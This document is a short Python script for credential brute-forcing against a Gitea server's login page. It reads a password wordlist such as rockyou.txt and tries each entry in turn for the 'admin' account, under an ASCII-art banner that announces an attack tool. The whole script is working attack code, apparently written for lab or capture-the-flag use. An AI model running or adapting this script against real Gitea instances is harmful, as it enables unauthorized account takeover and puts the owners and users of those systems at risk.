#!/usr/bin/python3
# Usage: python3 gitea_bf.py ip /path/to/wordlist

import requests
import sys
import time

if len(sys.argv) <= 1:
    print("Usage: python3 gitea_bf.py ip /path/to/wordlist")
    print("Example: python3 gitea_bf.py 172.16.1.20 /usr/share/wordlists/rockyou.txt")
    exit(1)

ip = sys.argv[1]
wordlist = sys.argv[2]

print("""\
   /\   /\
  //\\_//\\     ____
  \_     _/    /   /
   / * * \    /^^^]
   \_\O/_/    [   ]
    /   \_    [   /
    \     \_  /  /
     [ [ /  \/ _/
    _[ [ \  /_/""")
print("\n")
print("/*******************/")
print("Gitea Bruteforce Tool")
print("/*******************/")
print("\n")
print("Getting things ready...")
print("\n")
time.sleep(3)
print("Fire!")
print("\n")
time.sleep(1)
url = "http://"+ ip+":3000/user/login"

def brute(USERNAME,PASSWORD):
    data = {'user_name':USERNAME,'password':PASSWORD}
    s = requests.Session()
    r = s.post(url,data=data)
    if r.status_code != 200:
        print("[+] Correct Password Found: ",PASSWORD)
        sys.exit()
    else:
        print("[-] Invalid Password: ",PASSWORD)

def main():
	words = [w.strip() for w in open(wordlist, "rb").readlines()] #parse wordlist
	for payload in words:
		brute("admin",payload)

if __name__ == '__main__':
	main()
